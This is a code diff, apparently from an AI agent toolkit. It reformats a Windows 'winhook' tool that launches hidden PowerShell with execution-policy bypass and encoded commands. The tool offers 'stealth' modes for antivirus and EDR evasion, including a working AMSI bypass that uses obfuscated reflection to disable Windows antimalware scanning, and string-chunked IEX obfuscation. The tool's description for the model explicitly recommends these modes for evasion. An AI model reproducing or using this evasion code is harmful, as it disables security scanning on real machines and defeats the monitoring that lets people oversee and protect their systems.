@@ -545,7 +545,16 @@ function ps(script: string, timeout: number, stealth?: StealthMode) {
   if (mode === "base64") {
     return run(
       usePwsh ? "pwsh.exe" : "powershell.exe",
-      ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-EncodedCommand", toBase64(script)],
+      [
+        "-NoProfile",
+        "-NonInteractive",
+        "-ExecutionPolicy",
+        "Bypass",
+        "-WindowStyle",
+        "Hidden",
+        "-EncodedCommand",
+        toBase64(script),
+      ],
       timeout,
     )
   }
@@ -553,7 +562,16 @@ function ps(script: string, timeout: number, stealth?: StealthMode) {
     const patch = `$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');$f=$a.GetField('am'+'siInitFailed','NonPublic,Static');$f.SetValue($null,$true);`
     return run(
       usePwsh ? "pwsh.exe" : "powershell.exe",
-      ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-EncodedCommand", toBase64(patch + script)],
+      [
+        "-NoProfile",
+        "-NonInteractive",
+        "-ExecutionPolicy",
+        "Bypass",
+        "-WindowStyle",
+        "Hidden",
+        "-EncodedCommand",
+        toBase64(patch + script),
+      ],
       timeout,
     )
   }
@@ -563,7 +581,16 @@ function ps(script: string, timeout: number, stealth?: StealthMode) {
   const wrapped = `${vars};IEX(${concat})`
   return run(
     usePwsh ? "pwsh.exe" : "powershell.exe",
-    ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-EncodedCommand", toBase64(wrapped)],
+    [
+      "-NoProfile",
+      "-NonInteractive",
+      "-ExecutionPolicy",
+      "Bypass",
+      "-WindowStyle",
+      "Hidden",
+      "-EncodedCommand",
+      toBase64(wrapped),
+    ],
     timeout,
   )
 }
@@ -17440,7 +17467,11 @@ export const WinhookTool = Tool.define("winhook", {
           .map(([k, v]) => `${k} — ${v.description}`)
           .join("; "),
     ),
-    args: z.array(z.string()).describe("Arguments to pass to the program. Use --stealth <mode> for AV/EDR evasion: base64 (EncodedCommand), amsi (AMSI patch + Base64), obfuscate (string chunking + IEX + Base64)"),
+    args: z
+      .array(z.string())
+      .describe(
+        "Arguments to pass to the program. Use --stealth <mode> for AV/EDR evasion: base64 (EncodedCommand), amsi (AMSI patch + Base64), obfuscate (string chunking + IEX + Base64)",
+      ),
     timeout_seconds: z.number().optional().default(120).describe("Maximum execution time in seconds (default: 120)"),
   }),
   async execute(params) {
